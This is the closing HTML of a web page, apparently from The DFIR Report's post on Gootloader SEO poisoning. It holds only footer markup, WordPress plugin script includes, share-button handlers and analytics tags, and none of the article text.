</section><div class="resize-sensor" style="position: absolute; inset: 0px; overflow: hidden; z-index: -1; visibility: hidden;"><div class="resize-sensor-expand" style="position: absolute; left: 0; top: 0; right: 0; bottom: 0; overflow: hidden; z-index: -1; visibility: hidden;"><div style="position: absolute; left: 0px; top: 0px; transition: all 0s ease 0s; width: 434px; height: 1213px;"></div></div><div class="resize-sensor-shrink" style="position: absolute; left: 0; top: 0; right: 0; bottom: 0; overflow: hidden; z-index: -1; visibility: hidden;"><div style="position: absolute; left: 0; top: 0; transition: 0s; width: 200%; height: 200%"></div></div></div></div></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Theme: FreeNews <span class="sep"> | </span> By <a href="https://themespiral.com/">ThemeSpiral.com</a>. </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa fa-long-arrow-up"></i>Go Top</button>
</div>
<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2022\/05\/09\/seo-poisoning-a-gootloader-story\/":6736};
	</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0" id="wp-polyfill-js"></script>
<script type="text/javascript" id="contact-form-7-js-extra">
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/thedfirreport.com\/wp-json\/","namespace":"contact-form-7\/v1"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.5.6" id="contact-form-7-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=5.9.3" id="freenews-navigation-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=5.9.3" id="freenews-skip-link-focus-fix-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=5.9.3" id="ResizeSensor-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=5.9.3" id="theia-sticky-sidebar-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=5.9.3" id="slick-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=5.9.3" id="freenews-slick-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=5.9.3" id="jquery-sticky-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=5.9.3" id="freenews-sticky-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=5.9.3" id="marquee-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=5.9.3" id="freenews-marquee-settings-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/twitter-timeline.min.js?ver=4.0.0" id="jetpack-twitter-timeline-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-lazy-images/dist/intersection-observer.js?minify=false&amp;ver=b5fe079abfcad78b7237774a0b3115aa" id="jetpack-lazy-images-polyfill-intersectionobserver-js"></script>
<script type="text/javascript" id="jetpack-lazy-images-js-extra">
/* <![CDATA[ */
var jetpackLazyImagesL10n = {"loading_warning":"Images are still loading. Please cancel your print and try again."};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/jetpack_vendor/automattic/jetpack-lazy-images/dist/lazy-images.js?minify=false&amp;ver=567470f2f8d6d97f1a9cb9b77b0e503c" id="jetpack-lazy-images-js"></script>
<script type="text/javascript" id="wp_slimstat-js-extra">
/* <![CDATA[ */
var SlimStatParams = {"ajaxurl":"https:\/\/thedfirreport.com\/wp-admin\/admin-ajax.php","baseurl":"\/","dnt":"noslimstat,ab-item","ci":"YTo0OntzOjEyOiJjb250ZW50X3R5cGUiO3M6NDoicG9zdCI7czo4OiJjYXRlZ29yeSI7czoxMDoiNiw5NCw5NSwyMyI7czoxMDoiY29udGVudF9pZCI7aTo2NzM2O3M6NjoiYXV0aG9yIjtzOjY6ImVkaXRvciI7fQ--.ce438cb01362ef49e7b1de1465d6ae6a"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://cdn.jsdelivr.net/wp/wp-slimstat/tags/4.9.0.1/wp-slimstat.min.js" id="wp_slimstat-js"></script>
<script type="text/javascript" src="https://www.google.com/recaptcha/api.js?render=6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu&amp;ver=3.0" id="google-recaptcha-js"></script>
<script type="text/javascript" id="wpcf7-recaptcha-js-extra">
/* <![CDATA[ */
var wpcf7_recaptcha = {"sitekey":"6LdT96QZAAAAAPgYNKKHOXJj40TDn4FL6KFdhViu","actions":{"homepage":"homepage","contactform":"contactform"}};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/contact-form-7/modules/recaptcha/index.js?ver=5.5.6" id="wpcf7-recaptcha-js"></script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/modules/theme-tools/responsive-videos/responsive-videos.min.js?ver=1.3" id="jetpack-responsive-videos-min-script-js"></script>
<script type="text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/widgets/google-translate/google-translate.min.js?ver=10.9" id="google-translate-init-js"></script>
<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=10.9" id="google-translate-js"></script>
<script type="text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js?ver=10.9" id="sharing-js-js"></script>
<script type="text/javascript" id="sharing-js-js-after">
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
</script>
<script src="https://stats.wp.com/e-202219.js" defer="" type="text/javascript"></script>
<script type="text/javascript">
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:10.9',blog:'175340963',post:'6736',tz:'0',srv:'thedfirreport.com'} ]);
	_stq.push([ 'clickTrackerInit', '175340963', '6736' ]);
</script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v652eace1692a40cfa3763df669d7439c1639079717194" integrity="sha512-Gi7xpJR8tSkrpF7aordPZQlW2DLtzUlZcumS8dMQjwDHEnw9I7ZLyiOj/6tZStRBGtGgN6ceN6cMH8z7etPGlw==" data-cf-beacon="{&quot;rayId&quot;:&quot;7086ee67d9a7780f&quot;,&quot;version&quot;:&quot;2021.12.0&quot;,&quot;r&quot;:1,&quot;token&quot;:&quot;e6611380fbbe475a97dc9cf0a0e9fd2b&quot;,&quot;si&quot;:100}" crossorigin="anonymous"></script>


<img src="https://pixel.wp.com/g.gif?v=ext&amp;j=1%3A10.9&amp;blog=175340963&amp;post=6736&amp;tz=0&amp;srv=thedfirreport.com&amp;host=thedfirreport.com&amp;ref=&amp;fcp=1681&amp;rand=0.6209362053572642" alt="" width="6" height="5" id="wpstats"></body></html>